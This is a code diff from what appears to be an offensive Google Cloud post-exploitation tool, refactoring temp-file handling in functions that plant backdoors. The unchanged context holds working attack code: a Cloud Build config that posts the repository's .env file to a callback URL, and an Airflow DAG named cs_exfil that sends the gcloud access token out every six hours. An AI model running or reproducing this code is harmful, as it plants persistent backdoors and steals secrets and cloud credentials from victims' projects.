@@ -233,7 +233,7 @@ export async function cloudBuildBackdoor(args: string[], timeout: number): Promi
     return { output: output.join("\n"), findings }
   }
 
-  const configFile = `/tmp/cs-cloudbuild-${Date.now()}.yaml`
+  const configFile = `${process.env.TMPDIR || "/tmp"}/cs-cloudbuild-${Date.now()}.yaml`
   const buildConfig = `steps:
 - name: 'gcr.io/cloud-builders/curl'
   args: ['-X', 'POST', '-d', '@/workspace/.env', '${callbackUrl}']
@@ -249,31 +249,34 @@ export async function cloudBuildBackdoor(args: string[], timeout: number): Promi
 `
   await Bun.write(configFile, buildConfig)
 
-  const create = await gcloud(
-    [
-      "builds",
-      "triggers",
-      "create",
-      "cloud-source-repositories",
-      "--name",
-      `cs-build-${Date.now()}`,
-      "--repo",
-      repo,
-      "--branch-pattern",
-      `^${branch}$`,
-      "--build-config",
-      configFile,
-      "--project",
-      project,
-      "--quiet",
-    ],
-    timeout,
-  )
-
+  let create: Awaited<ReturnType<typeof gcloud>>
   try {
-    const { unlink } = await import("node:fs/promises")
-    await unlink(configFile)
-  } catch {}
+    create = await gcloud(
+      [
+        "builds",
+        "triggers",
+        "create",
+        "cloud-source-repositories",
+        "--name",
+        `cs-build-${Date.now()}`,
+        "--repo",
+        repo,
+        "--branch-pattern",
+        `^${branch}$`,
+        "--build-config",
+        configFile,
+        "--project",
+        project,
+        "--quiet",
+      ],
+      timeout,
+    )
+  } finally {
+    try {
+      const { unlink } = await import("node:fs/promises")
+      await unlink(configFile)
+    } catch {}
+  }
 
   if (create.exitCode === 0) {
     output.push(`[+] Build trigger created for repo ${repo} on branch ${branch}`)
@@ -352,15 +355,18 @@ from datetime import datetime, timedelta
 with DAG('cs_exfil', start_date=datetime(2024,1,1), schedule_interval=timedelta(hours=6), catchup=False) as dag:
     BashOperator(task_id='callback', bash_command='curl -X POST -d "$(gcloud auth print-access-token)" ${callbackUrl}/composer')
 `
-  const dagFile = `/tmp/cs-dag-${Date.now()}.py`
+  const dagFile = `${process.env.TMPDIR || "/tmp"}/cs-dag-${Date.now()}.py`
   await Bun.write(dagFile, dagContent)
 
-  const upload = await run("gsutil", ["cp", dagFile, `${dagBucket}/cs_exfil.py`], timeout)
-
+  let upload: Awaited<ReturnType<typeof run>>
   try {
-    const { unlink } = await import("node:fs/promises")
-    await unlink(dagFile)
-  } catch {}
+    upload = await run("gsutil", ["cp", dagFile, `${dagBucket}/cs_exfil.py`], timeout)
+  } finally {
+    try {
+      const { unlink } = await import("node:fs/promises")
+      await unlink(dagFile)
+    } catch {}
+  }
 
   if (upload.exitCode === 0) {
     output.push(`[+] Malicious DAG uploaded to ${dagBucket}/cs_exfil.py`)
